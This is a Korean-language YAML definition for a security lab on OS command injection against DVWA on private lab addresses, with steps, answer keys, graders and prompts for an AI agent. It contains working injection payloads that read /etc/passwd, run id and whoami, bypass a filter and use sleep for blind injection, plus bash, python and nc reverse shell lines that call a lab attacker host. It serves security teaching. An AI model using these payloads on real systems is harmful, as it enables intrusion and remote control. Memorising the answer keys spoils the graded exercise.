lab_id: web-vuln-ai-week10
title: Command Injection 실습 (AI 지원)
version: ai
course: web-vuln-ai
week: 10
description: DVWA와 JuiceShop 환경에서 OS 명령어 주입 취약점을 탐지하고, 다양한 메타문자와 우회 기법으로 공격합니다. AI
  SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: medium
duration_minutes: 120
objectives:
- OS 명령어 주입의 원리와 다양한 구분자를 이해한다
- Blind Command Injection 탐지 기법을 학습한다
- 필터 우회 기법과 방어 방법을 실습한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: DVWA(:8080)에 로그인하고 Command Injection 페이지에 정상적인 ping 요청을 보내 기능을 확인하시오.
  hint: 먼저 로그인하여 세션 쿠키를 획득한 후, /vulnerabilities/exec/ 페이지에 ip=127.0.0.1 파라미터를 POST로
    전송하세요.
  category: recon
  points: 8
  answer: "\U0001F916 프롬프트: DVWA(:8080)에 로그인하고 Command Injection 페이지에 정상적인 ping 요청을\
    \ 보내 기능을 확인해줘\n\U0001F4CE 참고 (CLI): curl -s -c /tmp/dvwa_cmd.txt \\\n  -d 'username=admin&password=password&Login=Login'\
    \ http://10.20.30.80:8080/login.php -L > /dev/null && curl -s -b /tmp/dvwa_cmd.txt\
    \ -b 'security=low' \\\n  -d 'ip=127.0.0.1&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
    \ \\\n | grep -oE 'PING|bytes from|ttl=' | head -5"
  answer_detail: DVWA의 Command Injection 페이지는 사용자 입력을 shell_exec('ping -c 4 '.$target)으로
    전달합니다. security=low에서는 입력 필터링이 없어 모든 명령어 구분자를 사용할 수 있습니다.
  verify:
    type: output_contains
    expect: PING
    field: stdout
  target_vm: attacker
  script: "curl -s -c /tmp/dvwa_cmd.txt \\\n  -d 'username=admin&password=password&Login=Login'\
    \ http://10.20.30.80:8080/login.php -L > /dev/null && curl -s -b /tmp/dvwa_cmd.txt\
    \ -b 'security=low' \\\n  -d 'ip=127.0.0.1&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
    \ \\\n | grep -oE 'PING|bytes from|ttl=' | head -5"
  risk_level: low
  bastion_prompt: DVWA(:8080)에 로그인하고 Command Injection 페이지에 정상적인 ping 요청을 보내 기능을 확인해줘
- order: 2
  instruction: 세미콜론(;)을 이용한 명령어 주입을 수행하시오. 127.0.0.1 뒤에 세미콜론으로 id 명령을 연결하라.
  hint: curl -d 'ip=127.0.0.1;+id&Submit=Submit' 형태로 POST하세요. security=low 쿠키 필요.
  category: exploit
  points: 12
  answer: "\U0001F916 프롬프트: 세미콜론(;)을 이용한 명령어 주입을 수행하시오. 127.0.0.1 뒤에 세미콜론으로 id 명령을\
    \ 연결해줘\n\U0001F4CE 참고 (CLI): curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\
    \n  -d 'ip=127.0.0.1;+id&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
    \ \\\n | grep -oP 'uid=\\d+\\([^)]+\\)'"
  answer_detail: 세미콜론(;)은 리눅스에서 명령어를 순차적으로 실행합니다. 앞의 ping 명령과 관계없이 id 명령이 실행됩니다. uid=33(www-data)가
    출력되면 웹 서버 프로세스 권한으로 명령이 실행된 것입니다.
  verify:
    type: output_contains
    expect: uid=
    field: stdout
  target_vm: attacker
  script: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\n  -d 'ip=127.0.0.1;+id&Submit=Submit'\
    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -oP 'uid=\\d+\\([^)]+\\\
    )'"
  risk_level: medium
  bastion_prompt: 세미콜론(;)을 이용한 명령어 주입을 수행하시오. 127.0.0.1 뒤에 세미콜론으로 id 명령을 연결해줘
- order: 3
  instruction: 파이프(|)를 이용한 명령어 주입을 수행하시오. cat /etc/passwd로 시스템 사용자 목록을 확인하라.
  hint: ip 파라미터에 '| cat /etc/passwd'를 넣으세요. 파이프 앞의 명령 없이 단독으로 뒤 명령만 실행됩니다.
  category: exploit
  points: 12
  answer: "\U0001F916 프롬프트: 파이프(|)를 이용한 명령어 주입을 수행하시오. cat /etc/passwd로 시스템 사용자 목록을\
    \ 확인해줘\n\U0001F4CE 참고 (CLI): curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\
    \n  -d 'ip=|+cat+/etc/passwd&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
    \ \\\n | grep -E 'root|www-data|sshd' | head -5"
  answer_detail: 파이프(|)는 앞 명령의 출력을 뒤 명령의 입력으로 전달합니다. 단독으로 사용하면 앞 명령 없이 뒤 명령만 실행됩니다.
    root:x:0:0이 출력되면 /etc/passwd 읽기에 성공한 것입니다.
  verify:
    type: output_contains
    expect: root
    field: stdout
  target_vm: attacker
  script: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\n  -d 'ip=|+cat+/etc/passwd&Submit=Submit'\
    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -E 'root|www-data|sshd'\
    \ | head -5"
  risk_level: medium
  bastion_prompt: 파이프(|)를 이용한 명령어 주입을 수행하시오. cat /etc/passwd로 시스템 사용자 목록을 확인해줘
- order: 4
  instruction: AND(&&) 연산자를 이용한 명령어 주입을 수행하시오. ping이 성공한 후 whoami와 네트워크 정보를 확인하라.
  hint: ip 파라미터에 '127.0.0.1 && whoami'를 넣으세요. &&는 URL 인코딩(%26%26)이 필요합니다.
  category: exploit
  points: 10
  answer: "\U0001F916 프롬프트: AND(&&) 연산자를 이용한 명령어 주입을 수행하시오. ping이 성공한 후 whoami와 네트워크\
    \ 정보를 확인해줘\n\U0001F4CE 참고 (CLI): curl -s -b /tmp/dvwa_cmd.txt -b 'security=low'\
    \ \\\n  -d 'ip=127.0.0.1+%26%26+whoami+%26%26+ip+addr+show+eth0&Submit=Submit'\
    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -E 'www-data|inet\
    \ ' | head -5"
  answer_detail: '&&(AND)는 첫 번째 명령이 성공(exit code 0)해야 두 번째 명령이 실행됩니다. &는 URL에서 파라미터
    구분자이므로 %26으로 인코딩해야 합니다. www-data와 IP 주소가 출력되면 성공입니다.'
  verify:
    type: output_contains
    expect: www-data
    field: stdout
  target_vm: attacker
  script: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' \\\n  -d 'ip=127.0.0.1+%26%26+whoami+%26%26+ip+addr+show+eth0&Submit=Submit'\
    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -E 'www-data|inet\
    \ ' | head -5"
  risk_level: medium
  bastion_prompt: AND(&&) 연산자를 이용한 명령어 주입을 수행하시오. ping이 성공한 후 whoami와 네트워크 정보를 확인해줘
- order: 5
  instruction: 백틱(`)과 $() 명령 치환을 이용한 명령어 주입을 수행하시오. 서버의 hostname을 확인하라.
  hint: ip 파라미터에 '127.0.0.1; echo HOSTNAME=$(cat /etc/hostname)'를 넣으세요.
  category: exploit
  points: 10
  answer: "\U0001F916 프롬프트: 백틱(`)과 $() 명령 치환을 이용한 명령어 주입을 수행해줘\n\U0001F4CE 참고 (CLI):\
    \ curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' --data-urlencode 'ip=127.0.0.1;\
    \ echo CMDI_HOSTNAME=$(cat /etc/hostname)' \\\n  -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
    \ \\\n | grep 'CMDI_HOSTNAME'"
  answer_detail: 백틱(`)이나 $()은 명령 치환(command substitution)으로, 내부 명령의 실행 결과가 외부 명령의
    인자로 대체됩니다. 필터가 세미콜론만 차단하는 경우 $()로 우회할 수 있습니다.
  verify:
    type: output_contains
    expect: CMDI_HOSTNAME
    field: stdout
  target_vm: attacker
  script: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=low' --data-urlencode 'ip=127.0.0.1;\
    \ echo CMDI_HOSTNAME=$(cat /etc/hostname)' \\\n  -d 'Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
    \ \\\n | grep 'CMDI_HOSTNAME'"
  risk_level: medium
  bastion_prompt: 백틱(`)과 $() 명령 치환을 이용한 명령어 주입을 수행해줘
- order: 6
  instruction: DVWA의 Medium 보안 레벨에서 명령어 주입 필터를 우회하시오. Medium에서는 &&와 ;가 필터링되지만 파이프(|)는
    허용된다.
  hint: security=medium 쿠키를 사용하고, 파이프(|)로 우회하세요. curl -b 'security=medium' -d 'ip=|+id&Submit=Submit'
    형태입니다.
  category: exploit
  points: 12
  answer: "\U0001F916 프롬프트: DVWA의 Medium 보안 레벨에서 명령어 주입 필터를 우회하시오. Medium에서는 &&와 ;가\
    \ 필터링되지만 파이프(|)는 허용된다해줘\n\U0001F4CE 참고 (CLI): curl -s -b /tmp/dvwa_cmd.txt -b\
    \ 'security=medium' \\\n  -d 'ip=|+id&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/\
    \ \\\n | grep -oP 'uid=\\d+\\([^)]+\\)'"
  answer_detail: Medium 레벨은 str_replace로 '&&'와 ';'만 필터링합니다. 파이프(|), OR(||), 줄바꿈(%0a),
    백틱(`) 등은 여전히 사용 가능합니다. 블랙리스트 필터링의 한계를 보여줍니다.
  verify:
    type: output_contains
    expect: uid=
    field: stdout
  target_vm: attacker
  script: "curl -s -b /tmp/dvwa_cmd.txt -b 'security=medium' \\\n  -d 'ip=|+id&Submit=Submit'\
    \ http://10.20.30.80:8080/vulnerabilities/exec/ \\\n | grep -oP 'uid=\\d+\\([^)]+\\\
    )'"
  risk_level: medium
  bastion_prompt: DVWA의 Medium 보안 레벨에서 명령어 주입 필터를 우회하시오. Medium에서는 &&와 ;가 필터링되지만 파이프(|)는
    허용된다해줘
- order: 7
  instruction: 시간 기반 Blind Command Injection을 테스트하시오. sleep 명령으로 응답 지연을 유발하여 명령 실행을
    확인하라.
  hint: ip 파라미터에 '127.0.0.1; sleep 3'을 넣고, curl의 -w '%{time_total}'로 응답 시간을 측정하세요.
    3초 이상이면 명령이 실행된 것입니다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 시간 기반 Blind Command Injection을 테스트하시오. sleep 명령으로 응답 지연을 유발하여 명령
    실행을 확인해줘

    📎 참고 (CLI): echo ''=== Normal Request ==='' && curl -s -o /dev/null -b /tmp/dvwa_cmd.txt
    -b ''security=low'' -d ''ip=127.0.0.1&Submit=Submit'' -w ''Time: %{time_total}s''
    http://10.20.30.80:8080/vulnerabilities/exec/ && echo '''' && echo ''=== Sleep
    Injection ==='' && curl -s -o /dev/null -b /tmp/dvwa_cmd.txt -b ''security=low''
    --data-urlencode ''ip=127.0.0.1; sleep 3'' -d ''Submit=Submit'' -w ''Time: %{time_total}s''
    http://10.20.30.80:8080/vulnerabilities/exec/'
  answer_detail: Blind Command Injection은 출력이 보이지 않을 때 사용합니다. sleep으로 지연을 유발하면 응답
    시간 차이로 명령 실행 여부를 판단합니다. 정상 요청 대비 3초 이상 지연되면 주입이 성공한 것입니다.
  verify:
    type: output_contains
    expect: Sleep Injection
    field: stdout
  target_vm: attacker
  script: 'echo ''=== Normal Request ==='' && curl -s -o /dev/null -b /tmp/dvwa_cmd.txt
    -b ''security=low'' -d ''ip=127.0.0.1&Submit=Submit'' -w ''Time: %{time_total}s''
    http://10.20.30.80:8080/vulnerabilities/exec/ && echo '''' && echo ''=== Sleep
    Injection ==='' && curl -s -o /dev/null -b /tmp/dvwa_cmd.txt -b ''security=low''
    --data-urlencode ''ip=127.0.0.1; sleep 3'' -d ''Submit=Submit'' -w ''Time: %{time_total}s''
    http://10.20.30.80:8080/vulnerabilities/exec/'
  risk_level: medium
  bastion_prompt: 시간 기반 Blind Command Injection을 테스트하시오. sleep 명령으로 응답 지연을 유발하여 명령
    실행을 확인해줘
- order: 8
  instruction: 리버스 쉘 페이로드를 작성하시오(실행 금지). 10.20.30.201(공격자 VM)로 연결하는 bash 리버스 쉘 명령을
    /tmp/revshell_payload.txt에 저장만 하라.
  hint: bash -i >& /dev/tcp/10.20.30.201/4444 0>&1 형태의 리버스 쉘 페이로드입니다.
  category: exploit
  points: 8
  answer: '🤖 프롬프트: 리버스 쉘 페이로드를 작성하시오(실행 금지) 구현 방법과 예시를 설명해줘

    📎 참고 (CLI): cat > /tmp/revshell_payload.txt << ''SHELLEOF''

    === Reverse Shell Payloads (학습 목적 - 실행 금지) ===

    bash -i >& /dev/tcp/10.20.30.201/4444 0>&1

    python3 -c ''import socket,subprocess,os;s=socket.socket();s.connect(("10.20.30.201",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])''

    nc -e /bin/bash 10.20.30.201 4444

    SHELLEOF

    echo ''Reverse shell payloads saved to /tmp/revshell_payload.txt'' && cat /tmp/revshell_payload.txt'
  answer_detail: 리버스 쉘은 대상 서버가 공격자에게 쉘 연결을 역으로 맺는 기법입니다. bash -i는 대화형 쉘, >& /dev/tcp/IP/PORT는
    TCP 소켓 리다이렉션, 0>&1은 stdin을 stdout으로 리다이렉션합니다. 방화벽이 인바운드를 차단해도 아웃바운드로 우회 가능합니다.
  verify:
    type: output_contains
    expect: Reverse shell payloads saved
    field: stdout
  target_vm: attacker
  script: 'cat > /tmp/revshell_payload.txt << ''SHELLEOF''

    === Reverse Shell Payloads (학습 목적 - 실행 금지) ===

    bash -i >& /dev/tcp/10.20.30.201/4444 0>&1

    python3 -c ''import socket,subprocess,os;s=socket.socket();s.connect(("10.20.30.201",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])''

    nc -e /bin/bash 10.20.30.201 4444

    SHELLEOF

    echo ''Reverse shell payloads saved to /tmp/revshell_payload.txt'' && cat /tmp/revshell_payload.txt'
  risk_level: medium
  bastion_prompt: 리버스 쉘 페이로드를 작성하시오(실행 금지) 구현 방법과 예시를 설명해줘
- order: 9
  instruction: ModSecurity WAF가 명령어 주입을 차단하는지 검증하시오. 포트 80(WAF 적용)에 명령어 주입 페이로드를 보내고,
    포트 8080(DVWA 직접)과 비교하라.
  hint: 같은 '; id' 페이로드를 포트 80과 포트 8080에 각각 전송하여 응답 코드(200 vs 403)를 비교하세요.
  category: defense
  points: 10
  answer: '🤖 프롬프트: ModSecurity WAF가 명령어 주입을 차단하는지 검증해줘

    📎 참고 (CLI): echo ''=== DVWA Direct (포트 8080) ==='' && curl -s -b /tmp/dvwa_cmd.txt
    -b ''security=low'' -d ''ip=127.0.0.1;+id&Submit=Submit'' http://10.20.30.80:8080/vulnerabilities/exec/
    | grep -oP ''uid=[^ ]+'' | head -1 && echo ''=== ModSecurity WAF (포트 80) ===''
    && curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.30.80:80/?cmd=;id''
    && echo '''' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' ''http://10.20.30.80:80/?input=127.0.0.1%7Ccat%20/etc/passwd'''
  answer_detail: ModSecurity OWASP CRS의 REQUEST-932 시리즈는 OS 명령어 패턴(;, |, &&와 id, cat,
    whoami 등의 조합)을 탐지합니다. WAF가 적용된 포트 80에서는 403이 반환되고, 직접 접근 시에는 명령이 실행됩니다. 다층 방어(WAF
    + 입력 검증 + escapeshellcmd())가 필요합니다.
  verify:
    type: output_contains
    expect: ModSecurity WAF
    field: stdout
  target_vm: attacker
  script: echo '=== DVWA Direct (포트 8080) ===' && curl -s -b /tmp/dvwa_cmd.txt -b
    'security=low' -d 'ip=127.0.0.1;+id&Submit=Submit' http://10.20.30.80:8080/vulnerabilities/exec/
    | grep -oP 'uid=[^ ]+' | head -1 && echo '=== ModSecurity WAF (포트 80) ===' &&
    curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?cmd=;id' &&
    echo '' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?input=127.0.0.1%7Ccat%20/etc/passwd'
  risk_level: low
